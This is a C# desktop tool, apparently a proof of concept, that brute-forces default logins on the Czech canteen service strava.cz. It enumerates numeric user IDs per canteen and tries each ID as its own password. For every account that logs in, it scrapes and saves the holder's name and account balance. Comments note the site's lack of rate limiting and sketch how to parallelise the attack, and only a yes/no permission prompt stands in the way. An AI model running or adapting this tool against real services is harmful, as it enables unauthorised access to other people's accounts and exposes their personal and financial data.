using HtmlAgilityPack;
using RestSharp;
using System.Web;

namespace strava_cz_bruteforce_default_login
{
    public partial class MainForm : Form
    {
        private const string canteen_list_url = "https://www.strava.cz/Strava/Stravnik/Zarizeni";
        private const string user_login_url = "https://www.strava.cz/Strava/Stravnik/Prihlaseni";

        private string canteens_savefile_name = Path.Combine(System.AppDomain.CurrentDomain.BaseDirectory, "canteens.txt");
        private string output_file_name = Path.Combine(System.AppDomain.CurrentDomain.BaseDirectory, "sinners.txt");
        private const string canteen_id_name_separator = ";-=-;";

        public MainForm()
        {
            InitializeComponent();

            CanteenList.DisplayMember = nameof(CanteenListItem.DisplayMember);
            CanteenList.ValueMember = nameof(CanteenListItem.Id);

            load_canteens_from_savefile();
        }

        private static string xpath_div_contains_class(string class_name) => $".//div[contains(concat(' ', normalize-space(@class), ' '), ' {class_name} ')]";
        private static string xpath_span_contains_class(string class_name) => $".//span[contains(concat(' ', normalize-space(@class), ' '), ' {class_name} ')]";
        private static string decode_html_chars(string html_decoded_string)
        {
            StringWriter temp_writer = new StringWriter();
            HttpUtility.HtmlDecode(html_decoded_string, temp_writer);
            return temp_writer.ToString();
        }

        private async void RefreshCanteensButton_Click(object sender, EventArgs e)
        {
            RestClient client = new RestClient(canteen_list_url);
            RestRequest request = new RestRequest("", Method.Get);

            RestResponse response = await client.ExecuteAsync(request);

            HtmlAgilityPack.HtmlDocument html_doc = new HtmlAgilityPack.HtmlDocument();
            html_doc.LoadHtml(response.Content);

            List<string> canteens_save_formatted = new List<string>();
            HtmlNodeCollection canteens = html_doc.DocumentNode.SelectNodes(xpath_div_contains_class("zarizeni-jidelna-obalka"));
            foreach (HtmlNode canteen in canteens) {
                string canteen_id = decode_html_chars(canteen.SelectSingleNode(xpath_div_contains_class("zarizeni-jidelna-id")).InnerText);
                string canteen_name = decode_html_chars(canteen.SelectSingleNode(xpath_div_contains_class("zarizeni-jidelna-nazev")).InnerText);
                canteens_save_formatted.Add($"{canteen_id}{canteen_id_name_separator}{canteen_name}");
            }

            if (File.Exists(canteens_savefile_name)) {
                File.Delete(canteens_savefile_name);
            }
            await File.WriteAllLinesAsync(canteens_savefile_name, canteens_save_formatted);

            load_canteens_from_savefile();
        }

        private async void load_canteens_from_savefile()
        {
            if (!File.Exists(canteens_savefile_name)) {
                return;
            }

            CanteenList.Items.Clear();

            List<CanteenListItem> available_canteens_formatted = new List<CanteenListItem>();
            string[] available_canteens = await File.ReadAllLinesAsync(canteens_savefile_name);
            foreach (string available_canteen in available_canteens) {
                string[] canteen_info = available_canteen.Split(canteen_id_name_separator);
                available_canteens_formatted.Add( new CanteenListItem() {
                    Id = canteen_info[0].Trim(),
                    Name = canteen_info[1].Trim()
                });
            }

            CanteenList.Items.AddRange(available_canteens_formatted.OrderBy(s => s.Id).ToArray());
        }

        private void log_line(string line) => LogViewer.Text += line + Environment.NewLine;
        private async void ExecuteButton_Click(object sender, EventArgs e)
        {
            int starting_number = (int)StartingNumberSelector.Value;
            int final_number = (int)FinalNumberSelector.Value;
            if (MessageBox.Show($"Are you sure you obtained permission from users in range: {starting_number} - {final_number}", "Warning!", MessageBoxButtons.YesNo, MessageBoxIcon.Warning) != DialogResult.Yes) {
                MessageBox.Show("Before proceeding, obtain a permission from ALL AFFECTED USERS.");
                return;
            }
            if (CanteenList.CheckedItems.Count == 0) {
                MessageBox.Show("At least one canteen has to be checked.");
                return;
            }
            if (final_number < starting_number) {
                MessageBox.Show("Enter a valid range.");
                return;
            }

            LogViewer.Clear();
            ExecutionProgress.Value = 0;
            // first +1 because the range is inclusive ; second +1 because I want to be able to call PerformStep after both loops
            ExecutionProgress.Maximum = ( (final_number - starting_number + 1) * CanteenList.CheckedItems.Count) + 1;

            if (ShouldSaveAccountsWithDefaultPassword.Checked && File.Exists(output_file_name)) {
                File.Delete(output_file_name);
            }

            // Somebody could theoretically make this run multiple tasks on multiple cors and scale really well - at time ([r * k] / [t * c]) - r => number_of_requests ; k => request response time ; t => tasks spawned ; c => cores used,
            // however since this project is for educational purposes only, so I am NOT going to implement that.
            // Nonetheless that approach should be currentlly possible to implement, because AFAIK strava does not rate limit requests
            IEnumerable<CanteenListItem> checked_canteens = CanteenList.CheckedItems.Cast<CanteenListItem>();
            foreach (CanteenListItem canteen in checked_canteens) {
                List<string> list_of_accounts_with_default_passwords = new List<string>();
                for (int i = starting_number; i <= final_number; i++) {
                    ExecutionProgress.PerformStep();
                    (bool could_login, HtmlAgilityPack.HtmlDocument response_page) = await send_login_attempt(canteen.Id, i.ToString());

                    if (!could_login) {
                        log_line($"{canteen.Id} - {i} does not have default password.");
                        continue;
                    }

                    string username = decode_html_chars(response_page.DocumentNode.SelectSingleNode(xpath_span_contains_class("uzivatel-jmeno-hodnota")).InnerText);
                    string overpay = decode_html_chars(response_page.DocumentNode.SelectSingleNode(xpath_span_contains_class("konto")).InnerText);

                    string output_line = $"{canteen.Id} - {i} => {username} ; {overpay}";
                    if (ShouldSaveAccountsWithDefaultPassword.Checked) {
                        list_of_accounts_with_default_passwords.Add(output_line);
                    }
                    log_line(output_line);
                }
                File.WriteAllLines(output_file_name, list_of_accounts_with_default_passwords);
            }
            ExecutionProgress.PerformStep();
        }

        private static async Task<(bool, HtmlAgilityPack.HtmlDocument)> send_login_attempt(string canteen, string username)
        {
            RestClient client = new RestClient(user_login_url);
            RestRequest request = new RestRequest("", Method.Post);
            request.AddHeader("Content-Type", "application/x-www-form-urlencoded");

            request.AddParameter("zarizeni", canteen);
            request.AddParameter("uzivatel", username);
            request.AddParameter("heslo", username);

            RestResponse response = await client.ExecuteAsync(request);

            HtmlAgilityPack.HtmlDocument html_doc = new HtmlAgilityPack.HtmlDocument();
            html_doc.LoadHtml(response.Content);

            // Unreliable way to test if user has an account, but it's good enought for now
            // It would be better to test for response code, however strava.cz always returns 200 at this moment
            HtmlNode? failed_login_node = html_doc.DocumentNode.SelectSingleNode("//div[@id='prihlaseni_neuspech']");
            return (failed_login_node == null, html_doc);
        }
    }
}